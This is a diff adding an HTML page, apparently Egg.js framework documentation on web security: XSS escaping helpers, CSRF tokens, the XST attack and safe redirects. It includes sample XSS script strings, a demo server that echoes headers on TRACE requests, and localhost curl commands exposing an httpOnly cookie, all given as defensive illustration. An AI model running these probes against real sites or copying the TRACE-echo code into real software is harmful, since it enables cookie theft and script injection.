@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Security - Born to build better enterprise frameworks and apps</title>
+  <meta charset="utf-8">
+  <meta name="description" content="index.description">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <link rel="icon" href="/images/favicon.png" type="image/x-icon">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/docsearch.js/2/docsearch.min.css" />
+<link rel="stylesheet" href="/css/index.css">
+
+</head>
+<body>
+  <div class="nav" >
+  <header>
+    <a href="/" class="nav-logo leftpadding" alt="egg"><img src="https://zos.alipayobjects.com/rmsportal/VTcUYAaoKqXyHJbLAPyF.svg"></a>
+    <ul class="nav-item">
+      <li>
+        <form id="search-form">
+          <input type="text" id="search-query" class="search-query st-default-search-input">
+        </form>
+      </li>
+      <li><a href="intro/" alt="Guide">Guide</a></li><li><a href="/api/" alt="API">API</a></li><li><a href="tutorials/index.html" alt="Tutorials">Tutorials</a></li><li><a href="https://github.com/search?q=topic%3Aegg-plugin&type=Repositories" alt="Plugins">Plugins</a></li><li><a href="https://github.com/eggjs/egg/releases" alt="Release">Release</a></li>
+      <!--
+      <li class="translations">
+        <a class="nav-link">Translations</a>
+        <span class="arrow"></span>
+        <ul class="dropdown-content">
+          <li><a href="/">中文</a></li>
+          <li><a href="/">English</a></li>
+        </ul>
+      </li>
+      -->
+      <li><iframe src="https://ghbtns.com/github-btn.html?user=eggjs&repo=egg&type=star&count=true" frameborder="0" scrolling="0" width="150px" height="20px"></iframe></li>
+    </ul>
+    <a id="mobileTrigger" href="#" class="mobile-trigger">
+      <ul>
+        <li></li>
+        <li></li>
+        <li></li>
+      </ul>
+    </a>
+  </header>
+</div>
+
+  <div id="container" class="container">
+    <div class="page-main">
+  <article class="markdown-body">
+    <h1>Security</h1>
+    <h2 id="concept-of-web-security"><a class="markdown-anchor" href="#concept-of-web-security">#</a> Concept of Web Security</h2>
+<p>There are a lot of security risks in Web applications, the risk will be used by hackers, while distort Web page content, or steal website internal data, further more, malicious code maybe embedded in the Web page, make users be weak. Common security vulnerabilities are as follows:</p>
+<ul>
+<li>XSS attack: inject scripts into Web pages, use JavaScript to steal user information, then induce user actions.</li>
+<li>CSRF attack: forgery user requests to launch malicious requests to the site.</li>
+<li>phishing attacks: use the site's links or images to create phishing traps.</li>
+<li>http parameter pollution: by using imperfect validation of parameter format, the server will be injected with parameters.</li>
+<li>remote code execution: users could implement command through browser, due to the server did not perform function against doing filtering, lead to malicious code execution.</li>
+</ul>
+<p>The framework itself has a rich solution for common security risks on the Web side:</p>
+<ul>
+<li>use <a href="https://github.com/eggjs/egg/blob/master/docs/source/zh-cn/basics/extend.md" target="_blank" rel="noopener">extend</a> mechanism to extend Helper API, various template filtering functions are provided to prevent phishing or XSS attacks.</li>
+<li>Support of common Web security headers.</li>
+<li>CSRF defense.</li>
+<li>flexible security configuration that matches different request urls.</li>
+<li>customizable white list for safe redirect and url filtering.</li>
+<li>all kinds of template related tools for preprocessing.</li>
+</ul>
+<p>Security plug-ins <a href="https://github.com/eggjs/egg-security" target="_blank" rel="noopener">egg-security</a> are built into the framework, provides default security practices.</p>
+<h3 id="open-or-close-the-configuration"><a class="markdown-anchor" href="#open-or-close-the-configuration">#</a> Open or close the configuration</h3>
+<p>Note: it is not recommended to turn off the functions provided by the security plug-ins unless the consequences are clearly confirmed.</p>
+<p>The security plug-in for the framework opens by default, if we want to close some security protection, directly set the <code>enable</code> attribute to false. For example, close xframe precautions:</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">exports.security = &#123;</span><br><span class="line">  xframe: &#123;</span><br><span class="line">    enable: <span class="literal">false</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h3 id="match-and-ignore"><a class="markdown-anchor" href="#match-and-ignore">#</a> match and ignore</h3>
+<p>Match and ignore methods and formats are the same with<a href="../basics/middleware.html#match%20and%20ignore">middleware general configuration</a>.</p>
+<p>If you want to set security config open for a certain path, you can configure <code>match</code> option.</p>
+<p>For example, just open csp when path contains <code>/example</code>, you can configure with the following configuration:</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">exports.security = &#123;</span><br><span class="line">  csp: &#123;</span><br><span class="line">    match: <span class="string">'/example'</span>,</span><br><span class="line">    policy: &#123;</span><br><span class="line">      <span class="comment">//...</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>If you want to set security config disable for a certain path, you can configure match option.</p>
+<p>For example, just disable xframe when path contains <code>/example</code> while our pages can be embedded in cooperative businesses , you can configure with the following configuration:</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">exports.security = &#123;</span><br><span class="line">  csp: &#123;</span><br><span class="line">    ignore: <span class="string">'/example'</span>,</span><br><span class="line">    xframe: &#123;</span><br><span class="line">      <span class="comment">//...</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>If you want to close some security protection against internal IP:</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">exports.security = &#123;</span><br><span class="line">  csrf: &#123;</span><br><span class="line">    <span class="comment">// To determine whether to ignore the method, request context "context" as the first parameter</span></span><br><span class="line">    ignore: <span class="function"><span class="params">ctx</span> =&gt;</span> isInnerIp(ctx.ip),</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>We'll look at specific scenarios to illustrate how to use the security scenarios provided by the framework for Web security precautions.</p>
+<h2 id="prevention-of-security-threat-xss"><a class="markdown-anchor" href="#prevention-of-security-threat-xss">#</a> Prevention of security threat <code>XSS</code></h2>
+<p><a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)" target="_blank" rel="noopener">XSS</a>（cross-site scripting）is the most common Web attack, which focus on &quot;cross-domain&quot; and &quot;client-side execution.&quot;</p>
+<p>XSS attacks generally fall into two categories:</p>
+<ul>
+<li>Reflected XSS</li>
+<li>Stored XSS</li>
+</ul>
+<h3 id="reflected-xss"><a class="markdown-anchor" href="#reflected-xss">#</a> Reflected XSS</h3>
+<p>Reflective XSS attacks, mainly because the server receives insecure input from the client, triggers the execution of a Web attack on the client side. Such as:</p>
+<p>Search for items on a shopping site, and results will display search keywords. Now you fill in the search keywords <code>&lt;script&gt;alert('handsome boy')&lt;/script&gt;</code>, then click search. If page does not filter the keywords, this code will be executed directly on the page, pop-up alert.</p>
+<h4 id="prevention"><a class="markdown-anchor" href="#prevention">#</a> Prevention</h4>
+<p>Framework provides <code>helper.escape()</code> method to do string XSS filter.</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> str = <span class="string">'&gt;&lt;script&gt;alert("abc") &lt;/script&gt;&lt;'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(ctx.helper.escape(str));</span><br><span class="line"><span class="comment">// =&gt; &amp;gt;&amp;lt;script&amp;gt;alert(&amp;quot;abc&amp;quot;) &amp;lt;/script&amp;gt;&amp;lt;</span></span><br></pre></td></tr></table></figure>
+<p>When the site need to output the result of user input directly, be sure to use <code>helper.escape()</code> wrapped. Such as in <a href="https://github.com/eggjs/egg-view-nunjucks" target="_blank" rel="noopener">egg-view-nunjucks</a> will overwrite the built-in <code>escape</code></p>
+<p>In another case, the output of server's interface will be provided to JavaScript to use. This time you need to use <code>helper.sjs()</code> for filtering.</p>
+<p><code>helper.sjs()</code> is used to output variables in JavaScript (including events such as onload), and do JavaScript ENCODE for characters in variables.
+All characters will be escaped to <code>\x</code> if there are not in whitelist, to prevent XSS attacks, also ensure the correctness of the output in JavaScript.</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> foo = <span class="string">'"hello"'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// not use sjs</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`var foo = "<span class="subst">$&#123;foo&#125;</span>";`</span>);</span><br><span class="line"><span class="comment">// =&gt; var foo = ""hello"";</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// use sjs</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`var foo = "<span class="subst">$&#123;<span class="keyword">this</span>.helper.sjs(foo)&#125;</span>";`</span>);</span><br><span class="line"><span class="comment">// =&gt; var foo = "\\x22hello\\x22";</span></span><br></pre></td></tr></table></figure>
+<p>There is also a case that sometimes we need to output json in JavaScript, which is easily exploited as a XSS vulnerability if it is not escaped. Framework provides <code>helper.sjson()</code> macro to do json encode, it will traverse the key in a json, all the character in the key's value will be escaped to <code>\x</code> if there are not in whitelist, to prevent XSS attacks, while keep the json structure unchanged.
+If you need to output a JSON string for use in JavaScript, please use <code>helper.sjson(variable name)</code> to escape.</p>
+<p><strong>The processing process is more complicated, the performance loss is larger, please use only if necessary</strong></p>
+<p>Example:</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="built_in">window</span>.locals = &#123;&#123; helper.sjson(locals) &#125;&#125;;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="stored-xss"><a class="markdown-anchor" href="#stored-xss">#</a> Stored XSS</h3>
+<p>Stored XSS attacks are stored on the server by submitting content with malicious scripts that will be launched when others see the content. The content is typically edited through some rich text editors, and it is easy to insert dangerous code.</p>
+<h4 id="prevention-2"><a class="markdown-anchor" href="#prevention-2">#</a> Prevention</h4>
+<p>Framework provides  <code>helper.shtml()</code> to do XSS filtering.</p>
+<p>Note that you need to use SHTML to handle the rich text (which contains the text of the HTML code) as a variable directly in the template.
+Use SHTML to output HTML tags, while executing XSS filtering, then it can filter out illegal scripts.</p>
+<p><strong>The processing process is more complicated, the performance loss is larger, please use only if you need to output html content</strong></p>
+<p>Example：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// js</span></span><br><span class="line"><span class="keyword">const</span> value = <span class="string">`&lt;a href="http://www.domain.com"&gt;google&lt;/a&gt;&lt;script&gt;evilcode…&lt;/script&gt;`</span>;</span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">// template</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  &#123;&#123; helper.shtml(value) &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">// =&gt; <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.domain.com"</span>&gt;</span>google<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&amp;lt;script&amp;gt;evilcode…&amp;lt;/script&amp;gt;</span><br></pre></td></tr></table></figure>
+<p>Shtml based on <a href="https://github.com/leizongmin/js-xss/" target="_blank" rel="noopener">xss</a> , and add filters by domain name.</p>
+<ul>
+<li><a href="https://github.com/leizongmin/js-xss/blob/master/lib/default.js" target="_blank" rel="noopener">defaule rule</a></li>
+<li><a href="http://jsxss.com/zh/options.html" target="_blank" rel="noopener">custom rule</a></li>
+</ul>
+<p>For example, only support <code>a</code> label, and all other properties except <code>title</code> are filtered:  <code>whiteList: {a: ['title']}</code></p>
+<p>options:</p>
+<ul>
+<li><code>config.helper.shtml.domainWhiteList: []</code> extend whilelist used by &quot;href&quot; and &quot;src&quot;</li>
+</ul>
+<p>Note shtml uses a strict whitelisting mechanism, not only filter out the XSS risk strings, all tags or attrs outside [the default rules] (https://github.com/leizongmin/js-xss/blob/master/lib/default.js) will be filtered out.</p>
+<p>For example, tag <code>HTML</code> is not in the whitelist.</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> html = <span class="string">'&lt;html&gt;&lt;/html&gt;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// html</span></span><br><span class="line">&#123;&#123; helper.shtml(html) &#125;&#125;</span><br><span class="line"><span class="comment">// empty output</span></span><br></pre></td></tr></table></figure>
+<p>Due to not in the whitelist, common properties like <code>data-xx</code> will be filtered.</p>
+<p>So, it is important to pay attention to the use of shtml, which is generally aimed at the rich text input from users, please avoid abuse, which can be restricted and affect the performance of the service.</p>
+<p>Such scenarios are generally like BBS, comment system, etc., even if does not support HTML content such as BBS input, do not use this Helper, direct use <code>escape</code> instead.</p>
+<h3 id="jsonp-xss"><a class="markdown-anchor" href="#jsonp-xss">#</a> JSONP XSS</h3>
+<p>JSONP's &quot;callback&quot; parameter is very dangerous, it has two kinds of risks that might lead to XSS</p>
+<ol>
+<li>Callback parameter will truncate js code, the special characters like single quotation, double quotation or line breaks, both are at risk.</li>
+</ol>
+<p>2、Callback parameter add tag maliciously(such as <code>&lt;script&gt;</code>), cause XSS risk.</p>
+<p>Refer to <a href="http://blog.knownsec.com/2015/03/jsonp_security_technic/" target="_blank" rel="noopener">JSONP security technic</a></p>
+<p>Within the framework, the <a href="https://github.com/node-modules/jsonp-body" target="_blank" rel="noopener">jsonp-body</a> is used to make jsonp requests safe.</p>
+<p>Defense content:</p>
+<ul>
+<li>maximum 50 character limit for the name of callback function</li>
+<li>callback function name only allow <code>[</code>, <code>]</code>, <code>a-zA-Z0123456789_</code>, <code>$</code>, <code>.</code> to prevent XSS or utf-7 XSS attacks, etc.</li>
+</ul>
+<p>Configration:</p>
+<ul>
+<li>callback - default is <code>_callback</code>, you can rename</li>
+<li>limit - callback function name length limit, default is 50.</li>
+</ul>
+<h3 id="other-xss-precautions"><a class="markdown-anchor" href="#other-xss-precautions">#</a> Other XSS precautions</h3>
+<p>Browser itself has some protection against all kinds of attacks, they generally take effect by opening the Web security headers. The framework has built-in support for some common Web security headers.</p>
+<h4 id="csp"><a class="markdown-anchor" href="#csp">#</a> CSP</h4>
+<p>CSP is short for Content Security Policy, It is mainly used to define which resources the page can load and reduce the occurrence of XSS.</p>
+<p>The framework supports the CSP configuration, but is closed by default, which can effectively prevent XSS attacks from happening. To configure the CSP, you need to know the policy strategy of CSP first, the details you can refer to [what CSP] (https://www.zhihu.com/question/21979782).</p>
+<h4 id="x-download-optionsnoopen"><a class="markdown-anchor" href="#x-download-optionsnoopen">#</a> X-Download-Options:noopen</h4>
+<p>Opened by default, introduced in IE8 to control visibility of the &quot;Open&quot; button on the file download dialog.</p>
+<p>Refer to http://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx</p>
+<h4 id="x-content-type-optionsnosniff"><a class="markdown-anchor" href="#x-content-type-optionsnosniff">#</a> X-Content-Type-Options:nosniff</h4>
+<p>Disable IE8 automatically sniffer such as <code>text/plain</code> rendered by <code>text/HTML</code> , especially when the content of this site is not credible.</p>
+<h4 id="x-xss-protection"><a class="markdown-anchor" href="#x-xss-protection">#</a> X-XSS-Protection</h4>
+<p>Some XSS detection and precautions provided by Internet explorer, enabled by default</p>
+<ul>
+<li>close default is false，equal to <code>1; mode=block</code></li>
+</ul>
+<h2 id="prevention-of-security-threat-csrf"><a class="markdown-anchor" href="#prevention-of-security-threat-csrf">#</a> Prevention of Security Threat <code>CSRF</code></h2>
+<p><a href="https://www.owasp.org/index.php/CSRF" target="_blank" rel="noopener">CSRF or XSRF</a> is short for Cross-site request forgery, also called  <code>One Click Attack</code> or <code>Session Riding</code>, is a malicious use of the site.</p>
+<p>CSRF attack will launch a malicious fake request for the site, which seriously affects the security of the site. Therefore, the framework has a built-in CSRF preparedness plan.</p>
+<h3 id="prevention-3"><a class="markdown-anchor" href="#prevention-3">#</a> Prevention</h3>
+<p>In general, there are some common <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet#CSRF_Specific_Defense" target="_blank" rel="noopener">precautions</a> for CSRF attacks. Briefly introduce several common precautions:</p>
+<ul>
+<li>
+<p>Synchronizer Tokens：When the response page is rendered, token is rendered in the page, which will be submitted through a hidden input when a form is submitted.</p>
+</li>
+<li>
+<p>Double Cookie Defense：The token will be stored in client Cookie, Cookie will be submitted when you submit a post request, then you can get the token, and submit the token through header or body, service side will compare and check it.</p>
+</li>
+<li>
+<p>Custom Header：Trust request with specific header（like <code>X-Requested-With: XMLHttpRequest</code>）. This can be bypassed, so frameworks like rails and django <a href="https://www.djangoproject.com/weblog/2011/feb/08/security/" target="_blank" rel="noopener">give up the guard</a>.</p>
+</li>
+</ul>
+<p>The framework combines these precautions to provide a configurable CSRF prevention strategy.</p>
+<h4 id="usage"><a class="markdown-anchor" href="#usage">#</a> Usage</h4>
+<h5 id="submit-form-with-csrf"><a class="markdown-anchor" href="#submit-form-with-csrf">#</a> Submit Form with CSRF</h5>
+<p>In synchronous rendering the page, you should add a parameter name called <code>_csrf</code> in the form's submit url, the value is <code>ctx.csrf</code>, when user submitting this form , CSRF token will be submitted:</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">action</span>=<span class="string">"/upload?_csrf=&#123;&#123; ctx.csrf | safe &#125;&#125;"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">  title: <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"title"</span> /&gt;</span></span><br><span class="line">  file: <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">type</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span>upload<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Fields that pass the CSRF token can be changed in the configuration:</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// config/config.default.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  security: &#123;</span><br><span class="line">    csrf: &#123;</span><br><span class="line">      queryName: <span class="string">'_csrf'</span>, <span class="comment">// CSRF token parameter name passed through query, default is _csrf</span></span><br><span class="line">      bodyName: <span class="string">'_csrf'</span>, <span class="comment">// CSRF token parameter name passed through body, default is _csrf</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>In order to prevent the <a href="http://breachattack.com/" target="_blank" rel="noopener">BREACH attack</a>, CSRF token rendered on the page will be changed everytime request changed, and the view plug-in, such as <code>egg-view-nunjucks</code>, will automatically inject the hidden field in Form without any perception of the application developer.</p>
+<h5 id="ajax-request"><a class="markdown-anchor" href="#ajax-request">#</a> AJAX Request</h5>
+<p>In the default configuration, the token is set in the Cookie, which can be fetched from the Cookie and sent to the server through query, body, or header when an AJAX request is requested.</p>
+<p>In jQuery:</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> csrftoken = Cookies.get(<span class="string">'csrfToken'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">csrfSafeMethod</span>(<span class="params">method</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// these HTTP methods do not require CSRF protection</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="regexp">/^(GET|HEAD|OPTIONS|TRACE)$/</span>.test(method));</span><br><span class="line">&#125;</span><br><span class="line">$.ajaxSetup(&#123;</span><br><span class="line">  beforeSend: <span class="function"><span class="keyword">function</span>(<span class="params">xhr, settings</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!csrfSafeMethod(settings.type) &amp;&amp; !<span class="keyword">this</span>.crossDomain) &#123;</span><br><span class="line">      xhr.setRequestHeader(<span class="string">'x-csrf-token'</span>, csrftoken);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>The fields that pass the CSRF token through the header can also be changed in the configuration:</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// config/config.default.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  security: &#123;</span><br><span class="line">    csrf: &#123;</span><br><span class="line">      headerName: <span class="string">'x-csrf-token'</span>, <span class="comment">// CSRF token passed through header, default is x-csrf-token</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h4 id="session-vs-cookie-store"><a class="markdown-anchor" href="#session-vs-cookie-store">#</a> Session vs Cookie Store</h4>
+<p>By default, the framework will present the CSRF token in a Cookie to facilitate AJAX requests. But all subdomains can set cookies, so when our application cannot  controll all subdomains, there may be a risk of CSRF attack stored in the Cookie. The framework provides a configuration that token can be stored in the Session.</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// config/config.default.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  security: &#123;</span><br><span class="line">    csrf: &#123;</span><br><span class="line">      useSession: <span class="literal">true</span>, <span class="comment">// default is false，if set to true , it will store csrf token in Session</span></span><br><span class="line">      cookieName: <span class="string">'csrfToken'</span>, <span class="comment">// Field in Cookie , default is csrfToken</span></span><br><span class="line">      sessionName: <span class="string">'csrfToken'</span>, <span class="comment">// Filed in Session , default is csrfToken</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h4 id="ignore-json-request"><a class="markdown-anchor" href="#ignore-json-request">#</a> Ignore JSON request</h4>
+<p>With security policy protection <a href="https://en.wikipedia.org/wiki/Same-origin_policy" target="_blank" rel="noopener">SOP</a>, basically all modern browsers do not allow cross domain request when content-type is set to JSON, so we can just leave out JSON request.</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// config/config.default.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  security: &#123;</span><br><span class="line">    csrf: &#123;</span><br><span class="line">      ignoreJSON: <span class="literal">true</span>, <span class="comment">// default is false，if set to be true ,it will leave out all request which content-type is `application/json`</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h4 id="refresh-csrf-token"><a class="markdown-anchor" href="#refresh-csrf-token">#</a> Refresh CSRF token</h4>
+<p>As CSRF token is stored in Cookie, once the user switches in the same browser, a new login user will still use the old token (old user used) before, this will bring certain security risks, so everytime user do login, website must refresh  <strong>CSRF token</strong>.</p>
+ <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// login controller</span></span><br><span class="line">exports.login = <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params">ctx</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; username, password &#125; = ctx.request.body;</span><br><span class="line">  <span class="keyword">const</span> user = <span class="keyword">await</span> ctx.service.user.find(&#123; username, password &#125;);</span><br><span class="line">  <span class="keyword">if</span> (!user) ctx.throw(<span class="number">403</span>);</span><br><span class="line">  ctx.session = &#123; user &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// call rotateCsrfSecret to refresh CSRF token</span></span><br><span class="line">  ctx.rotateCsrfSecret();</span><br><span class="line"></span><br><span class="line">  ctx.body = &#123; <span class="attr">success</span>: <span class="literal">true</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="prevention-of-security-threat-xst"><a class="markdown-anchor" href="#prevention-of-security-threat-xst">#</a> Prevention of Security Threat <code>XST</code></h2>
+<p><a href="https://www.owasp.org/index.php/XST" target="_blank" rel="noopener">XST</a> is short for <code>Cross-Site Tracing</code>, client send TRACE request to server, if the server implement TRACE responding by standard, the complete header information of the request will be returned in response body. This way, client can get some sensitive header fields, such as httpOnly cookies.</p>
+<p>Below, we implement a simple TRACE support server based on Koa:</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> koa = <span class="built_in">require</span>(<span class="string">'koa'</span>);</span><br><span class="line"><span class="keyword">var</span> app = koa();</span><br><span class="line"></span><br><span class="line">app.use(<span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">  ctx.cookies.set(<span class="string">'a'</span>, <span class="number">1</span>, &#123; <span class="attr">httpOnly</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">  <span class="keyword">if</span> (ctx.method === <span class="string">'TRACE'</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> body = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> (header <span class="keyword">in</span> ctx.headers) &#123;</span><br><span class="line">      body += header + <span class="string">': '</span> + ctx.headers[header] + <span class="string">'\r\n'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ctx.body = body;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">await</span> next;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">7001</span>);</span><br></pre></td></tr></table></figure>
+<p>You can send a GET request first <code>curl -i http://127.0.0.1:7001</code> when service started, you will get response below:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Powered-By: koa</span><br><span class="line">Set-Cookie: a=1; path=/; httponly</span><br><span class="line">Content-Type: text/plain; charset=utf-8</span><br><span class="line">Content-Length: 2</span><br><span class="line">Date: Thu, 06 Nov 2014 05:04:42 GMT</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+<p>Then server sets an httpOnly Cookie <code>a</code> to 1, it is not possible to get it through the script in the browser environment.</p>
+<p>Then we send a TRACE method request to the server with Cookie <code>curl -X TRACE -b a=1 -i http://127.0.0.1:7001</code>, and will get response below:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Powered-By: koa</span><br><span class="line">Set-Cookie: a=1; path=/; httponly</span><br><span class="line">Content-Type: text/plain; charset=utf-8</span><br><span class="line">Content-Length: 73</span><br><span class="line">Date: Thu, 06 Nov 2014 05:07:47 GMT</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">user-agent: curl/7.37.1</span><br><span class="line">host: 127.0.0.1:7001</span><br><span class="line">accept: */*</span><br><span class="line">cookie: a=1</span><br></pre></td></tr></table></figure>
+<p>The complete header information can be seen in the response body, so that we bypass the httpOnly limit and get the cookie a= 1, causing a great risk.</p>
+<h3 id="more"><a class="markdown-anchor" href="#more">#</a> More</h3>
+<p>http://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html</p>
+<p>http://deadliestwebattacks.com/2010/05/18/cross-site-tracing-xst-the-misunderstood-vulnerability/</p>
+<h3 id="prevention-4"><a class="markdown-anchor" href="#prevention-4">#</a> Prevention</h3>
+<p>The framework has banned three types of dangerous request type: trace, track, options.</p>
+<h2 id="prevention-of-security-threats-phishing-attacks"><a class="markdown-anchor" href="#prevention-of-security-threats-phishing-attacks">#</a> Prevention of Security threats <code>phishing attacks</code></h2>
+<p>There are many ways to Phishing, here will introduce url Phishing, photo Phishing and iframe Phishing.</p>
+<h3 id="url-phishing"><a class="markdown-anchor" href="#url-phishing">#</a> URL Phishing</h3>
+<p>The server side does not check and control the incoming redirect url variable, which can lead to malicious construction of any malicious address, then can induce users to redirect to malicious websites.</p>
+<p>Due to redirect from a trusted site, users will be more trust, so redirect risk is commonly used in phishing attacks, by going to a malicious web site and cheat users enter the user name and password to steal user information, make money trading or deceive users;</p>
+<p>It may also cause XSS attact (mainly use 302 redirect often, set HTTP response headers: <code>Location: url</code>, if the url contains a CRLF, it could partition the HTTP response headers, make the back part falls to HTTP body, leading to XSS).</p>
+<h3 id="prevention-5"><a class="markdown-anchor" href="#prevention-5">#</a> Prevention</h3>
+<ul>
+<li>If the redirect url can be determined in advance, including the value of the url and parameters, you can configured in the background first. If do redirect, directly preach corresponding index of url, and find corresponding specific url  then redirect through index;</li>
+<li>If the redirect url is not previously determined, but it is generated by server background (not passing by user's parameter), you can make a redirect link, then  sign it;</li>
+<li>if 1 and 2 are not satisfied, url could not determine beforehand and only pass through the front end of the incoming parameters, url must be validated before redirect, to judge whether it within the application authorization whitelist.</li>
+</ul>
+<p>The framework provides a safe redirect method to avoid this risk by configuring a whitelist.</p>
+<ul>
+<li><code>ctx.redirect(url)</code> If redirect url is not in the whitelist of configuration, it is forbidden.</li>
+<li><code>ctx.unsafeRedirect(url)</code> Allow all redirects, It is generally not recommended to use after a clear understanding of possible risks.</li>
+</ul>
+<p>Safety plan covers the default <code>ctx.redirect</code> method, all redirects will go through security domain.</p>
+<p>You need to do the following configuration in the application configuration file if user use <code>ctx.redirect</code> method:</p>
